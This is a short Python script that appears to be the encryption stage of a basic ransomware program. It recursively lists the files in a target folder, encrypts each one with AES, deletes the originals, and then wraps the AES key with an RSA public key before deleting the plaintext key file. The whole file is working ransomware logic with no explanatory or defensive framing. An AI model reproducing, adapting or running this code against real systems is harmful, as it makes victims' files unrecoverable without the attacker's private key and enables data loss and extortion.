from Crypto.Cipher import AES, PKCS1_OAEP
from tools import get_venv_var, all_files, delete_file, read_bytes, write_bytes
from tools import ABS_ROUTE_TARGET_FOLDER
from mykeys import bytes_to_RSA_key


def encrypt_file_aes(file_name: str, aes_key: bytes) -> None:
    file_data = read_bytes(file_name)

    cipher = AES.new(aes_key, AES.MODE_EAX)

    encrypted_data, tag = cipher.encrypt_and_digest(file_data)

    with open(file_name + '.enc', 'wb') as f:
        f.write(cipher.nonce)
        f.write(tag)
        f.write(encrypted_data)


def encrypt_file_RSA(file_name: str, pub_key) -> None:
    data = read_bytes(file_name)
    cipher = PKCS1_OAEP.new(pub_key)
    encrypted_data = cipher.encrypt(data)
    write_bytes(encrypted_data, file_name + '.enc')


if __name__ == '__main__':

    TARGET = get_venv_var('TARGET')
    if TARGET == None:
        TARGET = ABS_ROUTE_TARGET_FOLDER

    print('target:', TARGET)

    target_files = all_files(TARGET)
    aes_key_file = 'aes_key.bin'
    aes_key = read_bytes(aes_key_file)
    for file in target_files:
        encrypt_file_aes(file, aes_key)
        delete_file(file)

    pub_key = bytes_to_RSA_key(read_bytes('pub_key.bin'))
    encrypt_file_RSA(aes_key_file, pub_key)
    delete_file(aes_key_file)

